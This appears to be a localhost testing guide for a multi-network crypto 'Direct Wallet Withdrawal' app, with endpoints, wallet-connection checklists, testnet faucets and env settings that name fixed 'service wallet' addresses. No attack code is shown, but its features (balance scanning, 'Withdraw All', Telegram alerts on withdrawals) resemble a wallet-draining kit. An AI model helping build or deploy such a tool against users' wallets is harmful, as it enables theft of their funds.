# 🧪 Localhost Testing Guide

## ✅ Status: Development Servers Running

### Server Ports

| Service | URL | Status |
|---------|-----|--------|
| **Backend API** | `http://localhost:3001` | ✅ Running |
| **Web App** | `http://localhost:3000` | ✅ Ready |

---

## 📊 Backend Server Health

```json
{
  "message": "Direct Wallet Withdrawal Server",
  "status": "running",
  "version": "1.0.0"
}
```

✅ **Backend Status:** Healthy
- ✅ Listening on port 3001
- ✅ CORS enabled
- ✅ Ready to accept requests
- ✅ No errors

---

## 🌐 Web App (Next.js)

- ✅ Listening on port 3000
- ✅ Dev server ready (4.9s startup)
- ✅ Hot reload enabled
- ✅ TypeScript compilation active

**Access:** Open browser to `http://localhost:3000`

---

## 🧪 Testing Checklist

### Backend API Endpoints to Test
```bash
# Health check
GET http://localhost:3001

# Telegram notification endpoint
POST http://localhost:3001/api/telegram/notify
Content-Type: application/json
{
  "eventType": "withdrawal",
  "message": "Test transaction"
}

# PayPal IPN endpoint
POST http://localhost:3001/api/paypal/ipn
```

### Frontend Features to Test
- [ ] Connect wallet (MetaMask, Coinbase, WalletConnect)
- [ ] Switch between networks (Ethereum, BSC, Polygon, etc.)
- [ ] Check network balance
- [ ] View token balances
- [ ] Scan TRC20 tokens (if wallet has Tron)
- [ ] Enter withdrawal amount
- [ ] Select recipient wallet
- [ ] Confirm transaction (test with goerli/testnet)

### Network Verification
- [ ] All 12 networks display correctly
- [ ] Gas prices update in real-time
- [ ] Chain switcher works smoothly
- [ ] Wallet connector opens modal
- [ ] Account balance displays

---

## 📝 Test Network Transfers

### Test on Testnet (Recommended)

Before going live, test on:

1. **Ethereum Sepolia**
   - RPC: `https://sepolia.infura.io/v3/YOUR_KEY`
   - Faucet: `https://sepolia-faucet.pk910.de/`

2. **Polygon Mumbai**
   - RPC: `https://rpc-mumbai.maticvigil.com`
   - Faucet: `https://faucet.polygon.technology/`

3. **BSC Testnet**
   - RPC: `https://data-seed-prebsc-1-b.binance.org:8545`
   - Faucet: `https://testnet.binance.org/faucet-smart`

4. **Tron Shasta (TRC20)**
   - Network: Shasta testnet
   - Faucet: `https://www.trongrid.io/shasta`

---

## 🔧 Troubleshooting

### If Web App Doesn't Load
1. Check dev server is running: `npm run dev`
2. Wait for page compilation to complete
3. Check browser console for errors (F12)
4. Clear cache: Ctrl+Shift+R

### If Backend Doesn't Respond
1. Check port 3001 is not in use: `netstat -ano | findstr :3001`
2. Check server logs in terminal
3. Verify environment variables are set

### If Network Connections Fail
1. Check internet connection
2. Verify RPC endpoints are accessible
3. Run: `node comprehensive-network-test.js`
4. Check firewall settings

---

## 📋 Environment Variables Needed

### For Testing Locally

Create `.env.local` in `apps/web/`:
```env
NEXT_PUBLIC_WALLET_PROVIDER_URL=https://mainnet.infura.io/v3/YOUR_KEY
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=YOUR_PROJECT_ID
NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
NEXT_PUBLIC_SERVICE_WALLET_TRON=TBtv1VHYa3Hj1Vevt5ehj3xmqFov8M9xHe
```

Create `.env.local` in `apps/server/`:
```env
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN
TELEGRAM_CHAT_ID=YOUR_CHAT_ID
PORT=3001
```

---

## ✨ Key Testing Points

### 1. Wallet Connection
- [ ] Metamask extension detects localhost
- [ ] QR code displays for WalletConnect
- [ ] Coinbase Wallet connects
- [ ] Account displays correctly

### 2. Network Switching
- [ ] Can switch to all 11 EVM networks
- [ ] Gas prices display for each network
- [ ] Balances update when network changes
- [ ] No errors in console

### 3. Token Transfers
- [ ] Can enter amount
- [ ] Can select recipient
- [ ] "Withdraw All" button works
- [ ] Fee calculation displays
- [ ] Transaction signing works

### 4. Tron Integration
- [ ] Tron wallet address accepted
- [ ] TRC20 token contract recognized
- [ ] Token symbol resolves
- [ ] Balance shows correctly
- [ ] Can send TRC20 withdrawal

### 5. Error Handling
- [ ] Invalid addresses rejected
- [ ] Insufficient balance warning
- [ ] Network errors handled gracefully
- [ ] User notifications display

---

## 🚀 Ready for Testing!

Your application is now running locally and ready for comprehensive testing before going online.

**Start by opening:** `http://localhost:3000` in your browser

---

**Generated:** 2026-08-08
**Status:** Ready for Local Testing ✅
